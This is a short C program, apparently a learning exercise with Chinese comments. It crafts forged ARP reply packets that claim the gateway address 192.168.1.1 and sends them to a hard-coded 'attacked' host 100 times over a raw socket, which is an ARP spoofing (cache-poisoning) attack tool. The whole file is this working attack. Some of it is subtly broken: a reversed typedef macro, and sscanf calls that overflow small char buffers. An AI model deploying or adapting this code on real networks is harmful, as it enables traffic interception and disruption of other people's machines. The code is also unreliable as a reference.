/******************************************************************************
*    > File Name: arp.c
*
*    >Description: 
*
*    >Version: 1.0
*    > Created Time: 2013年10月29日 星期二 09时37分47秒
*    >Revision: none
*    >Compiler: gcc
*
*    > Author: linzhenhua
*    > Mail: linzhenhualzh@163.com 
*    > Company: 
*
******************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <net/ethernet.h>

#ifndef u_char
#define unsigned char u_char
#endif

void encapsulate_arp(char *source_mac, char *source_ip, char *dest_mac, char *dest_ip);
void mac_str(char *mac, char *buf);
void ip_str(char *ip, char *buf);

//struct ether_header eh;         //以太网头部信息(函数库自带)
//struct arphdr ea_hdr;           //ARP头部信息(函数库自带)

struct ether_arp                          //ARP协议数据结构
{   /*顺序不要写错*/
    struct arphdr ea_hdr;                 //ARP头部信息
    u_char arp_sha[6];                    //sender hardware address(源mac地址)6个字节
    u_char arp_spa[4];                    //sender protocol address(源IP地址)4个字节
    u_char arp_tha[6];                    //target hardware address(目的mac地址)6个字节
    u_char arp_tpa[4];                    //target protocol address(目的IP地址)4个字节
};

struct arppacket               //ARP报文格式(以太网帧头部+ARP协议数据结构)
{
    struct ether_header eh;    //14个字节
    struct ether_arp ea;       //28个字节
}arp;

int main(int argc, char **argv)
{
    int i;   //循环变量

    int sockfd;           //套接字描述符

    struct sockaddr to;   //通用套接口地址结构

    /*伪装的IP和mac地址*/
    char *source_mac = "00:0C:29:77:5A:66";
    char *source_ip = "192.168.1.1";

    /*被攻击者*/
    char *dest_mac = "F0:4D:A2:BB:46:1C";
    char *dest_ip = "192.168.1.100";
    
    /*封装ARP报文*/
    encapsulate_arp(source_mac, source_ip, dest_mac, dest_ip);

    /*创建套接字*/
    if( (sockfd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP))) < 0 )
    {
        perror("socket");
        exit(-1);
    }

    /*填充地址*/
    bzero(&to, sizeof(struct sockaddr));
    to.sa_family = AF_INET;
    strcpy(to.sa_data, "eth0");      //以太网

    for(i = 0; i < 100; ++i)
    {
        sendto(sockfd, &arp, sizeof(struct arppacket), 0, &to, sizeof(struct sockaddr));
        sleep(1);
    }

    printf("send over\n");

    return 0;
}

void encapsulate_arp(char *source_mac, char *source_ip, char *dest_mac, char *dest_ip)
{
    char *mac_buf;
    char *ip_buf;

    mac_buf = (char *)malloc( 6*sizeof(char) );
    if(NULL == mac_buf)
        exit(-1);

    ip_buf = (char *)malloc( 4*sizeof(char) );
    if(NULL == ip_buf)
        exit(-1);

    mac_str(dest_mac, mac_buf);
    memcpy(arp.eh.ether_dhost, mac_buf, 6);             //填充目标mac地址

    mac_str(source_mac, mac_buf);
    memcpy(arp.eh.ether_shost, mac_buf, 6);             //填充源mac地址

    arp.eh.ether_type = htons(ETHERTYPE_ARP);           //填充类型

    arp.ea.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);         //硬件类型
    arp.ea.ea_hdr.ar_pro = htons(ETHERTYPE_IP);         //协议类型
    arp.ea.ea_hdr.ar_hln = 6;                           //硬件类型长度48位，6个字节
    arp.ea.ea_hdr.ar_pln = 4;                           //协议地址长度32位，4个字节
    arp.ea.ea_hdr.ar_op = htons(ARPOP_REPLY);           //操作字段(ARP应答)

    mac_str(source_mac, mac_buf);
    memcpy(arp.ea.arp_sha, mac_buf, 6);                 //填充源mac地址

    ip_str(source_ip, ip_buf);
    memcpy(arp.ea.arp_spa, ip_buf, 4);                  //填充源IP地址

    mac_str(dest_mac, mac_buf);
    memcpy(arp.ea.arp_tha, mac_buf, 6);                 //填充目标mac地址

    ip_str(dest_ip, ip_buf);
    memcpy(arp.ea.arp_tpa, ip_buf, 4);                  //填充目标IP地址
}

void mac_str(char *mac, char *buf)
{
    sscanf(mac, "%x:%x:%x:%x:%x:%x", buf+0, buf+1,buf+2,buf+3, buf+4, buf+5);
}

void ip_str(char *ip, char *buf)
{
    sscanf(ip, "%d.%d.%d.%d", buf+0, buf+1, buf+2, buf+3);
}
